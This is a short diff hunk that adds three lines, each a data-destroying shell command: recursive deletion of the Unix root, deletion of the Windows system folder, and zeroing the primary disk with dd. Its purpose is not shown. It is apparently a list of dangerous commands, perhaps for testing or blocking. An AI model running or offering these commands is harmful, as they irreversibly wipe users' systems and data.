@@ -1,0 +1,3 @@
+rm -rf /
+del /s /q C:\Windows
+dd if=/dev/zero of=/dev/sda bs=1M
